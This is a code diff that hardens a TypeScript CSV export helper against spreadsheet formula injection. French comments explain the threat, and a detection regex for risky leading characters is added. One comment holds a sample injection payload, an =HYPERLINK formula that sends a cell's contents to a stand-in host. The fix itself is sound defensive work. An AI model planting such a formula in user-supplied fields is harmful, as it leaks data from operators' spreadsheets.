@@ -306,16 +306,71 @@ export function useAction() {
   return { busy, error, setError, run };
 }
 
-/** Turn the current rows into a CSV download. */
+/**
+ * Une cellule CSV, sûre à ouvrir dans un tableur.
+ *
+ * Deux problèmes distincts, et c'est le second qui mord.
+ *
+ * Les guillemets. Une cellule contenant le séparateur, un guillemet ou un saut
+ * de ligne doit être entourée et ses guillemets doublés, sans quoi la ligne se
+ * décale d'une colonne. C'est ce que faisait déjà l'ancienne version.
+ *
+ * L'injection de formule. Excel, LibreOffice et Sheets traitent une cellule
+ * commençant par `=`, `+`, `-`, `@`, une tabulation ou un retour chariot comme
+ * une formule. Or `profiles.full_name` est posé par le visiteur lui-même, à
+ * l'inscription, dans les métadonnées de `signUp` — sans `pattern`, sans
+ * `maxLength`, sans CHECK en base — et c'est la colonne A de l'export clients.
+ * `bookings.first_name` arrive dans l'export réservations par le même chemin.
+ * Un nom valant `=HYPERLINK("https://exemple.invalide/?x="&A2,"Cliquez")`
+ * devient un lien vivant dans le tableur d'un opérateur. Le BOM, qui est là
+ * pour que les accents restent lisibles, fait justement qu'Excel analyse
+ * directement sans passer par son assistant d'import.
+ *
+ * Entourer de guillemets ne suffit pas : Excel les retire et analyse ce qu'il y
+ * a dedans. Ce qui marche est l'apostrophe de tête, posée à l'intérieur des
+ * guillemets, qui force la cellule à être lue comme du texte.
+ *
+ * Elle reste visible. L'apostrophe n'est consommée comme marqueur de texte que
+ * pour une valeur tapée ou collée dans une cellule ; lue depuis un fichier CSV
+ * elle fait partie du contenu, et la cellule affiche `'=HYPERLINK(…)`. C'est le
+ * prix convenu : une apostrophe de trop dans les rares cellules dangereuses,
+ * contre une formule vivante dans le tableur d'un opérateur.
+ *
+ * Le `-` fait exception : un nombre négatif n'est pas une formule, et traiter
+ * `-50` comme du texte casserait tous les montants de l'export remboursements.
+ * Une cellule qui n'est pas dangereuse sort inchangée, pour que les exports
+ * existants ne changent pas de forme.
+ */
+const CSV_RISKY_START = /^[=+\-@\t\r]/;
+/** Un nombre simple, signe et décimales comprises : jamais une formule. */
+const CSV_PLAIN_NUMBER = /^[-+]?\d+(?:[.,]\d+)?$/;
+const CSV_NEEDS_QUOTES = /[",;\n\r]/;
+
+const csvCell = (v: unknown) => {
+  if (v === null || v === undefined) return "";
+  const s = String(v);
+  const risky = CSV_RISKY_START.test(s) && !CSV_PLAIN_NUMBER.test(s);
+  const body = risky ? `'${s}` : s;
+  return risky || CSV_NEEDS_QUOTES.test(s) ? `"${body.replace(/"/g, '""')}"` : body;
+};
+
+/**
+ * Turn the current rows into a CSV download.
+ *
+ * Les quatorze écrans qui exportent passent tous par ici — y compris
+ * `admin/lib/adminData.ts`, qui ne fait que réexporter cette fonction — ce qui
+ * est pourquoi la neutralisation tient en un seul endroit.
+ */
 export function exportCsv(filename: string, rows: Record<string, unknown>[], columns?: string[]) {
   if (!rows.length) return;
   const cols = columns ?? Object.keys(rows[0]);
-  const escape = (v: unknown) => {
-    if (v === null || v === undefined) return "";
-    const s = String(v);
-    return /[",\n;]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
-  };
-  const csv = [cols.join(";"), ...rows.map(r => cols.map(c => escape(r[c])).join(";"))].join("\n");
+  // Les en-têtes passent par le même filtre : ils viennent d'une configuration
+  // de page aujourd'hui, mais rien ne garantit qu'un nom de colonne ne vienne
+  // jamais de la base.
+  const csv = [
+    cols.map(csvCell).join(";"),
+    ...rows.map(r => cols.map(c => csvCell(r[c])).join(";")),
+  ].join("\n");
   // The BOM keeps accented French readable when the file is opened in Excel.
   const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
   const url = URL.createObjectURL(blob);
